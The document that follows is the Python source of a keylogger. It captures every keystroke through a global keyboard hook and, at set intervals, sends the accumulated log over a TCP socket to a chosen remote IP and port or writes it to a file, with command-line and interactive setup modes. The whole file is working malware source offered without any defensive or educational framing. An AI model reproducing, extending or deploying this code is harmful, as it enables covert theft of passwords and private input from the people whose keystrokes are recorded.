#!/usr/bin/python
import keyboard
from threading import Semaphore, Timer
import socket
import argparse
import re
import os

ip_pattern = r"(?:[0-9]{1,3}\.){3}[0-9]{1,3}"

class Keylogger:
    def __init__(self, interval, target, port):
        self.interval = interval
        self.target = target
        self.port = port
        self.log = ""
        self.semaphore = Semaphore(0)

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name

    def report(self):
        if self.log:
            if self.port != 0:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.connect((self.target, self.port))
                    sock.send(self.log.encode())
                    sock.close
                    self.log = ""
                except:
                    pass
            else:
                if not self.target.closed:
                    self.target.write(self.log)
                    self.target.flush()
                    self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        keyboard.on_release(callback=self.callback)
        self.report()
        self.semaphore.acquire()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    sub_commands = parser.add_subparsers(title="mode", required=True, dest="mode", metavar="manual, prompt")
    
    manual = sub_commands.add_parser('manual', aliases=['m'])
    manual.add_argument("target", help="IP or filename")
    manual.add_argument("-p", "--port", required=False, help="If IP is specified, target port #", type=int, dest="port")
    manual.add_argument("-i", "--interval", required=False, help="Report interval, Default 1 minute", default=60, type=int, dest="interval")
    prompt = sub_commands.add_parser('prompt', aliases=['p'])
    args = parser.parse_args()

    try:
        if args.mode == "prompt" or args.mode == "p":
            target = input("Target: ")
            match = re.search(ip_pattern, target)
            if match is not None:
                try:
                    port = int(input("Port: "))
                except ValueError:
                    print("Port must be an integer")
                    exit(1)
            else:
                port = 0
                try:
                    target = open(args.target, "w+")
                except (IOError, FileNotFoundError):
                    print("Cannot open")
                    exit(1)

            try:
                interval = int(input("Interval: "))
            except ValueError:
                print("Interval must be an integer")
                exit(1)

        else:
            match = re.search(ip_pattern, args.target)
            if match is not None and args.port is None:
                parser.error("If target is an ipv4 address, port # is required")
            if match is None:
                port = 0
                try:
                    target = open(args.target, "w+")
                except (IOError, FileNotFoundError):
                    print("Cannot open")
                    exit(1)
            else:
                port = args.port
                target = args.target
            interval = args.interval

        keylogger = Keylogger(interval, target, port)
        keylogger.start()
    finally:
        if 'target' in locals() and not isinstance(target, str):
            target.close()

